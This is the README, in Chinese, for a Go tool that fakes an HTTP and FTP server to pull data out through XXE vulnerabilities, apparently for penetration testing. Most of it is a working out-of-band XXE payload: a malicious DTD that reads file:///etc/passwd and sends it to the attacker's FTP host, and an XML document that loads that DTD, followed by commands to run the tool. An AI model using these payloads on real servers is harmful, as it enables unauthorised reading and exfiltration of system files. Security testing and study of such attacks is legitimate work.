# go-fake-ftp-server
## 功能简介

使用Go编写的用于测试XXE漏洞的工具，通过伪造FTP服务外带文件数据。

HTTP服务默认运行于 8008 端口，默认用同目录下的`evil.dtd`作为http响应的恶意dtd文件。FTP服务默认运行于 2121 端口。

```
./fake-ftp-server -h
Usage of ./fake-ftp-server:
  -file string
        evil dtd file (default "evil.dtd")
  -ftpport string
        FTP server port (default "2121")
  -httpport string
        HTTP server port (default "8008")
```

## 使用方法

编写`evil.dtd`放于程序同目录下：
```
<!ENTITY % c SYSTEM "file:///etc/passwd">
<!ENTITY % d "<!ENTITY &#37; e SYSTEM 'ftp://ip:FTPport/%c;'>">
%d;
```

恶意xml文档：
```
<?xml version="1.0"?>
<!DOCTYPE a [
   <!ENTITY % b SYSTEM "http://ip:HTTPport/"> 
   %b; 
   %e; 
]>
<a></a>
```

执行`fake-ftp-server`程序，按照默认参数值启动：
```
./fake-ftp-server
```

![alt](/img/4.png)

上传恶意xml文档到存在XXE漏洞的服务器进行测试，HTTP服务：

![alt](/img/1.png)

FTP服务，成功获取`/etc/passwd`完整内容：

![alt](/img/2.png)

![alt](/img/3.png)

也可以指定参数启动：
```
./fake-ftp-server -file=1.dtd -httpport=8009 -ftpport=2122
```

![alt](/img/5.png)

修改恶意dtd和xml文档为对应服务端口，同样能实现外带文件的功能：

![alt](/img/6.png)


